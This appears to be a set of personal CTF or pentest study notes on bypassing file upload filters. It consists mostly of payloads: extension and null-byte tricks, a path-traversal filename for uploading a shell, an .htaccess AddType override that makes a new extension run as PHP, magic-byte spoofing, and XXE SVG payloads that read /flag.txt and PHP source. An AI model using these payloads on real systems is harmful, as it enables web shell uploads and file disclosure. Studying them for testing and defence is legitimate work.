#encoding
#php
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt

[[File Upload]]

##### XSS in file name

##### Double extension 
`.jpg.php`

##### Reverse Double Extension
`.php.jpg`

##### Add trailing characters. 
Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`

##### URL encoding
%

##### Null byte
Adding `%00` to http requests creates miracles.
`exploit.php%00.jpg`
then open `/uploads/exploit.php%00.jpg` 
`%00` ends parsing on it and downloads `exploit.php`

##### Low level functions of C/C++
`exploit.asp;.jpg` or `exploit.asp%00.jpg`

###### Try using multibyte unicode characters,
Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E`

##### If extensions is stripped, double it
`exploit.p.phphp`

##### Upload to different directory
```
Content-Disposition: form-data; name="avatar"; filename="../shell3.php"
```

Trying to bypass filters:
```
filename="..%2fshell3.php"
```

then open `avatars/../shell3.php`

##### Replace .htaccess if some extensions are not allowed
[[file upload with apache]]
```
AddType application/x-httpd-php .nope
```

##### Character Injection

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Content-type:

in the zero bytes of file:

`GIF8`
`PNG`

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt

Mime types:

[File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime).

#xml
SVG/XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
<svg>&xxe;</svg>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```